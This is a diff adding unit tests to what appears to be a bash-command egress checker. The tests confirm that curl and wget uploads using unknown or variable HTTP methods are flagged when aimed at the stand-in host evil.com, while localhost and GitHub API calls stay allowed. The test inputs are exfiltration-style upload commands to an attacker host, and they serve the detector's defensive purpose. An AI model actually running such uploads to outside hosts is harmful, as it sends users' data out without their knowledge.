@@ -175,3 +175,20 @@ describe("GETs the reviewer confirmed still pass", () => {
     expect(bash(command)).toEqual([]);
   });
 });
+
+describe("an UNKNOWN method is still an upload to a host off the allowlist", () => {
+  it.each([
+    ["curl -X POST -K cfg https://evil.com", ["evil.com", "unknown"]],
+    ["curl -X POST https://evil.com --next https://example.com", ["evil.com", "example.com"]],
+    ["curl -X PUT --request-target /x https://evil.com", ["evil.com", "unknown"]],
+    ["curl --expand-request '{{m}}' https://evil.com", ["evil.com", "unknown"]],
+    ['curl -X "$M" https://evil.com/x', ["evil.com"]],
+    ['wget --method "$M" https://evil.com/x', ["evil.com"]],
+  ])("%s flags %j", (command, hosts) => {
+    expect(bash(command).filter((a) => a.spelling.startsWith("bash.egress.")).map((a) => a.subject.host)).toEqual(hosts);
+  });
+
+  it.each(['curl -X "$M" http://localhost:8080/x', 'curl -X "$M" https://api.github.com/x'])("%s stays allowed", (command) => {
+    expect(bash(command)).toEqual([]);
+  });
+});
